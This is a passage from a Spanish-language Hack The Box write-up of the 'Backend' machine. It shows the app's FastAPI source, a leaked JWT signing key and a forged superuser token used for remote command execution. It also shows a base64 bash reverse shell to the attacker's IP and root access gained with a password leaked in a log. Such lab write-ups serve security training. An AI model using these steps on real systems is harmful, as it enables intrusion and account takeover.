    <span class=mtk5>return</span> <span class=mtk1>{</span><span class=mtk4>"endpoints"</span><span class=mtk1>:[</span><span class=mtk4>"user"</span><span class=mtk1>,</span> <span class=mtk4>"admin"</span><span class=mtk1>]}</span>


<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.get</span><span class=mtk1>(</span><span class=mtk4>"/docs"</span><span class=mtk1>)</span>
<span class="mtk7 mtki">async</span> <span class="mtk7 mtki">def</span> <span class=mtk8>get_documentation</span><span class=mtk1>(</span>
    <span class="mtk9 mtki squiggly-inline-unnecessary">current_user</span><span class=mtk1>:</span> <span class=mtk1>User</span> <span class=mtk5>=</span> <span class=mtk1>Depends(deps.parse_token)</span>
<span class=mtk1>):</span>
    <span class=mtk5>return</span> <span class=mtk1>get_swagger_ui_html(</span><span class="mtk9 mtki">openapi_url</span><span class=mtk5>=</span><span class=mtk4>"/openapi.json"</span><span class=mtk1>,</span> <span class="mtk9 mtki">title</span><span class=mtk5>=</span><span class=mtk4>"docs"</span><span class=mtk1>)</span>

<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.get</span><span class=mtk1>(</span><span class=mtk4>"/openapi.json"</span><span class=mtk1>)</span>
<span class="mtk7 mtki">async</span> <span class="mtk7 mtki">def</span> <span class=mtk8>openapi</span><span class=mtk1>(</span>
    <span class="mtk9 mtki squiggly-inline-unnecessary">current_user</span><span class=mtk1>:</span> <span class=mtk1>User</span> <span class=mtk5>=</span> <span class=mtk1>Depends(deps.parse_token)</span>
<span class=mtk1>):</span>
    <span class=mtk5>return</span> <span class=mtk1>get_openapi(</span><span class="mtk9 mtki">title</span> <span class=mtk5>=</span> <span class=mtk4>"FastAPI"</span><span class=mtk1>,</span> <span class="mtk9 mtki">version</span><span class=mtk5>=</span><span class=mtk4>"0.1.0"</span><span class=mtk1>,</span> <span class="mtk9 mtki">routes</span><span class=mtk5>=</span><span class=mtk1>app</span><span class=mtk1>.routes)</span>

<span class=mtk1>app</span><span class=mtk1>.include_router(api_router,</span> <span class="mtk9 mtki">prefix</span><span class=mtk5>=</span><span class=mtk1>settings.</span><span class=mtk6>API_V1_STR</span><span class=mtk1>)</span>
<span class=mtk1>app</span><span class=mtk1>.include_router(</span><span class=mtk1>root_router</span><span class=mtk1>)</span>

<span class="mtk7 mtki">def</span> <span class=mtk8>start</span><span class=mtk1>():</span>
    <span class=mtk5>import</span> <span class=mtk1>uvicorn</span>

    <span class="mtk8 mtku">uvicorn</span><span class=mtk1>.run(</span><span class=mtk1>app</span><span class=mtk1>,</span> <span class="mtk9 mtki">host</span><span class=mtk5>=</span><span class=mtk4>"0.0.0.0"</span><span class=mtk1>,</span> <span class="mtk9 mtki">port</span><span class=mtk5>=</span><span class=mtk6>8001</span><span class=mtk1>,</span> <span class="mtk9 mtki">log_level</span><span class=mtk5>=</span><span class=mtk4>"debug"</span><span class=mtk1>)</span>

<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>"__main__"</span><span class=mtk1>:</span>
    <span class=mtk3>#</span> <span class=mtk3>Use</span> <span class=mtk3>this</span> <span class=mtk3>for</span> <span class=mtk3>debugging</span> <span class=mtk3>purposes</span> <span class=mtk3>only</span>
    <span class=mtk5>import</span> <span class=mtk1>uvicorn</span>

    <span class="mtk8 mtku">uvicorn</span><span class=mtk1>.run(</span><span class=mtk1>app</span><span class=mtk1>,</span> <span class="mtk9 mtki">host</span><span class=mtk5>=</span><span class=mtk4>"0.0.0.0"</span><span class=mtk1>,</span> <span class="mtk9 mtki">port</span><span class=mtk5>=</span><span class=mtk6>8001</span><span class=mtk1>,</span> <span class="mtk9 mtki">log_level</span><span class=mtk5>=</span><span class=mtk4>"debug"</span><span class=mtk1>)</span>
</code></pre></div><p>Aquí hay una referencia a otro módulo para importar <code>settings</code> (aquí deberíamos encontrar la clave secreta para la implementación de JWT). Este se llama <code>app.core.config</code>, por lo que el archivo que queremos es <code>app/core/config.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>get_file</span> /home/htb/uhc/app/core/config.py  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>from</span> <span class=mtk1>pydantic</span> <span class=mtk5>import</span> <span class=mtk1>AnyHttpUrl,</span> <span class=mtk1>BaseSettings,</span> <span class=mtk1>EmailStr,</span> <span class=mtk1>validator</span>
<span class=mtk5>from</span> <span class="mtk8 mtku">typing</span> <span class=mtk5>import</span> <span class=mtk1>List</span><span class=mtk1>,</span> <span class="mtk8 mtku">Optional</span><span class=mtk1>,</span> <span class="mtk8 mtku">Union</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">enum</span> <span class=mtk5>import</span> <span class="mtk8 mtku squiggly-inline-unnecessary">Enum</span>


<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">Settings</span><span class=mtk1>(</span><span class="mtk8 mtki mtku">BaseSettings</span><span class=mtk1>):</span>
    <span class=mtk1>API_V1_STR</span><span class=mtk1>:</span> <span class="mtk8 mtku">str</span> <span class=mtk5>=</span> <span class=mtk4>"/api/v1"</span>
    <span class=mtk1>JWT_SECRET</span><span class=mtk1>:</span> <span class="mtk8 mtku">str</span> <span class=mtk5>=</span> <span class=mtk4>"SuperSecretSigningKey-HTB"</span>
    <span class=mtk1>ALGORITHM</span><span class=mtk1>:</span> <span class="mtk8 mtku">str</span> <span class=mtk5>=</span> <span class=mtk4>"HS256"</span>

    <span class=mtk3>#</span> <span class=mtk3>60</span> <span class=mtk3>minutes</span> <span class=mtk3>*</span> <span class=mtk3>24</span> <span class=mtk3>hours</span> <span class=mtk3>*</span> <span class=mtk3>8</span> <span class=mtk3>days</span> <span class=mtk3>=</span> <span class=mtk3>8</span> <span class=mtk3>days</span>
    <span class=mtk1>ACCESS_TOKEN_EXPIRE_MINUTES</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span> <span class=mtk5>=</span> <span class=mtk6>60</span> <span class=mtk5>*</span> <span class=mtk6>24</span> <span class=mtk5>*</span> <span class=mtk6>8</span>

    <span class=mtk3>#</span> <span class=mtk3>BACKEND_CORS_ORIGINS</span> <span class=mtk3>is</span> <span class=mtk3>a</span> <span class=mtk3>JSON-formatted</span> <span class=mtk3>list</span> <span class=mtk3>of</span> <span class=mtk3>origins</span>
    <span class=mtk3>#</span> <span class=mtk3>e.g:</span> <span class=mtk3>'["</span><span class="mtk3 detected-link">http://localhost</span><span class=mtk3>",</span> <span class=mtk3>"</span><span class="mtk3 detected-link">http://localhost:4200</span><span class=mtk3>",</span> <span class=mtk3>"</span><span class="mtk3 detected-link">http://localhost:3000</span><span class=mtk3>",</span> <span class=mtk3>\\</span>
    <span class=mtk3>#</span> <span class=mtk3>"</span><span class="mtk3 detected-link">http://localhost:8080</span><span class=mtk3>",</span> <span class=mtk3>"</span><span class="mtk3 detected-link">http://local.dockertoolbox.tiangolo.com</span><span class=mtk3>"]'</span>
    <span class=mtk1>BACKEND_CORS_ORIGINS</span><span class=mtk1>:</span> <span class=mtk1>List</span><span class=mtk1>[AnyHttpUrl]</span> <span class=mtk5>=</span> <span class=mtk1>[]</span>

    <span class=mtk8>@validator</span><span class=mtk1>(</span><span class=mtk4>"BACKEND_CORS_ORIGINS"</span><span class=mtk1>,</span> <span class="mtk9 mtki">pre</span><span class=mtk5>=</span><span class=mtk6>True</span><span class=mtk1>)</span>
    <span class="mtk7 mtki">def</span> <span class=mtk8>assemble_cors_origins</span><span class=mtk1>(</span><span class="mtk9 mtki">cls</span><span class=mtk1>,</span> <span class="mtk9 mtki">v</span><span class=mtk1>:</span> <span class="mtk8 mtku">Union</span><span class=mtk1>[</span><span class="mtk8 mtku">str</span><span class=mtk1>,</span> <span class=mtk1>List</span><span class=mtk1>[</span><span class="mtk8 mtku">str</span><span class=mtk1>]])</span> <span class=mtk1>-&gt;</span> <span class="mtk8 mtku">Union</span><span class=mtk1>[</span><span class=mtk1>List</span><span class=mtk1>[</span><span class="mtk8 mtku">str</span><span class=mtk1>],</span> <span class="mtk8 mtku">str</span><span class=mtk1>]:</span>  
        <span class=mtk5>if</span> <span class=mtk8>isinstance</span><span class=mtk1>(</span><span class="mtk9 mtki">v</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>)</span> <span class=mtk5>and</span> <span class=mtk5>not</span> <span class="mtk9 mtki">v</span><span class=mtk1>.</span><span class=mtk8>startswith</span><span class=mtk1>(</span><span class=mtk4>"["</span><span class=mtk1>):</span>
            <span class=mtk5>return</span> <span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>.</span><span class=mtk8>strip</span><span class=mtk1>()</span> <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk9 mtki">v</span><span class=mtk1>.</span><span class=mtk8>split</span><span class=mtk1>(</span><span class=mtk4>","</span><span class=mtk1>)]</span>
        <span class=mtk5>elif</span> <span class=mtk8>isinstance</span><span class=mtk1>(</span><span class="mtk9 mtki">v</span><span class=mtk1>,</span> <span class=mtk1>(</span><span class="mtk8 mtku">list</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>)):</span>
            <span class=mtk5>return</span> <span class="mtk9 mtki">v</span>
        <span class=mtk5>raise</span> <span class="mtk8 mtku">ValueError</span><span class=mtk1>(</span><span class="mtk9 mtki">v</span><span class=mtk1>)</span>

    <span class=mtk1>SQLALCHEMY_DATABASE_URI</span><span class=mtk1>:</span> <span class="mtk8 mtku">Optional</span><span class=mtk1>[</span><span class="mtk8 mtku">str</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>"sqlite:///uhc.db"</span>
    <span class=mtk1>FIRST_SUPERUSER</span><span class=mtk1>:</span> <span class=mtk1>EmailStr</span> <span class=mtk5>=</span> <span class=mtk4>"root@ippsec.rocks"</span>

    <span class="mtk7 mtki">class</span> <span class="mtk8 mtku">Config</span><span class=mtk1>:</span>
        <span class=mtk1>case_sensitive</span> <span class=mtk5>=</span> <span class=mtk6>True</span>


<span class=mtk1>settings</span> <span class=mtk5>=</span> <span class="mtk8 mtku">Settings</span><span class=mtk1>()</span>
</code></pre></div><p>Y ahí tenemos la clave utilizada para firmar los <em>tokens</em> JWT (<code>SuperSecretSigningKey-HTB</code>). Ahora podemos modificar el <em>token</em> que teníamos y poner <code>is_superuser</code> en <code>true</code> y añadir <code>debug</code> usando <a href=https://jwt.io>jwt.io</a>:</p><p><img src=/images/HTB/Backend/Backend-jwt-debug.png alt="Backend JWT debug"></p><p>Podemos ejecutar comandos con este <em>token</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'10.10.11.161/api/v1/admin/exec/whoami'</span> -H <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A'</span>  
"htb"
</code></pre></div><p>Para usar espacios, tenemso que ponerlo en codificación URL (<code>%20</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'10.10.11.161/api/v1/admin/exec/uname%20-a'</span> -H <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A'</span>  
"Linux Backend 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux"
</code></pre></div><h2 id=intrusión-en-la-máquina>Intrusión en la máquina</h2><p>Vamos a conseguir una <em>reverse shell</em> en la máquina:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-magenta>$(</span><span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/ /%20/g'</span> &lt;&lt;&lt; <span class=code-dark-yellow>'10.10.11.161/api/v1/admin/exec/echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span><span class=code-dark-magenta>)</span> -H <span class=code-dark-yellow>'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A'</span>  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.161.
Ncat: Connection from 10.10.11.161:37026.
bash: cannot set terminal process group (669): Inappropriate ioctl for device  
bash: no job control in this shell
htb@Backend:~/uhc$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
htb@Backend:~/uhc$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
htb@Backend:~/uhc$ export TERM=xterm
htb@Backend:~/uhc$ export SHELL=bash
htb@Backend:~/uhc$ stty rows 50 columns 158
</code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios</h2><p>En el directorio actual tenemos estos archivos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>htb@Backend:~/uhc$ ls -la
total 80
drwxrwxr-x 1 htb htb   296 Apr 15 03:56 <span class=code-blue>.</span>
drwxr-xr-x 1 htb htb   192 Apr 15 03:56 <span class=code-blue>..</span>
drwxrwxr-x 1 htb htb   138 Apr  6 13:27 <span class=code-blue>.git</span>
-rw-rw-r-- 1 htb htb    18 Apr  6 13:27 .gitignore
drwxr-xr-x 1 htb htb    66 Apr  9 15:10 <span class=code-blue>.venv</span>
drwxr-xr-x 1 htb htb    54 Apr 10 00:59 <span class=code-blue>__pycache__</span>
drwxrwxr-x 1 htb htb    90 Apr  6 14:43 <span class=code-blue>alembic</span>
-rwxrwxr-x 1 htb htb  1592 Apr  6 13:27 <span class=code-green>alembic.ini</span>
drwxrwxr-x 1 htb htb   218 Apr 10 01:02 <span class=code-blue>app</span>
-rw-r--r-- 1 htb htb  3998 Apr 15 04:08 auth.log
-rwxrwxr-x 1 htb htb   127 Apr  6 18:31 <span class=code-green>builddb.sh</span>
-rw-rw-r-- 1 htb htb 19353 Apr  6 13:27 poetry.lock
-rw-rw-r-- 1 htb htb  2750 Apr 10 01:36 populateauth.py
-rwxrwxr-x 1 htb htb   171 Apr  6 13:27 <span class=code-green>prestart.sh</span>
-rw-rw-r-- 1 htb htb   332 Apr  6 13:27 pyproject.toml
-rw-rw-r-- 1 htb htb   118 Apr  9 15:10 requirements.txt  
-rwxrwxr-x 1 htb htb   241 Apr 10 01:02 <span class=code-green>run.sh</span>
-rw-r--r-- 1 htb htb 24576 Apr 15 03:49 uhc.db
</code></pre></div><p>Si miramos el archivo <code>auth.log</code>, vemos algunos eventos de <code>admin@htb.local</code>, y un valor extraño <code>Tr0ub4dor&3</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>htb@Backend:~/uhc$ head -15 auth.log
04/14/2022, 07:16:39 - Login Success for admin@htb.local  
04/14/2022, 07:19:59 - Login Success for admin@htb.local
04/14/2022, 07:33:19 - Login Success for admin@htb.local
04/14/2022, 07:36:39 - Login Success for admin@htb.local
04/14/2022, 07:41:39 - Login Success for admin@htb.local
04/14/2022, 07:44:59 - Login Success for admin@htb.local
04/14/2022, 07:58:19 - Login Success for admin@htb.local
04/14/2022, 08:06:39 - Login Success for admin@htb.local
04/14/2022, 08:08:19 - Login Success for admin@htb.local
04/14/2022, 08:14:59 - Login Success for admin@htb.local
04/14/2022, 08:23:19 - Login Failure for Tr0ub4dor&3
04/14/2022, 08:24:54 - Login Success for admin@htb.local
04/14/2022, 08:24:59 - Login Success for admin@htb.local
04/14/2022, 08:25:19 - Login Success for admin@htb.local
04/14/2022, 08:26:39 - Login Success for admin@htb.local
</code></pre></div><p>El usuario <code>htb</code> pertenece a los grupos <code>sudo</code> y <code>lxd</code>, que son útiles para escalar privilegios:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>htb@Backend:~/uhc$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  
</code></pre></div><p>Podemos tratar de usar este valor extraño como contraseña para <code>htb</code> (para ganar privilegios de <code>root</code> mediante <code>sudo</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>htb@Backend:~/uhc$ sudo su
[sudo] password for htb:
Sorry, try again.
[sudo] password for htb:
sudo: 1 incorrect password attempt  
</code></pre></div><p>No funciona, pero sí que es la contraseña de <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>htb@Backend:~/uhc$ su root
Password:
root@Backend:/home/htb/uhc# cat /root/root.txt  
6ec23ed1654a955109e42bb23d730973
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#registrando-una-nueva-cuenta>Registrando una nueva cuenta</a></li><li><a href=#leyendo-documentación>Leyendo documentación</a></li><li><a href=#obteniendo-acceso-privilegiado>Obteniendo acceso privilegiado</a></li><li><a href=#leyendo-archivos-del-servidor>Leyendo archivos del servidor</a></li><li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>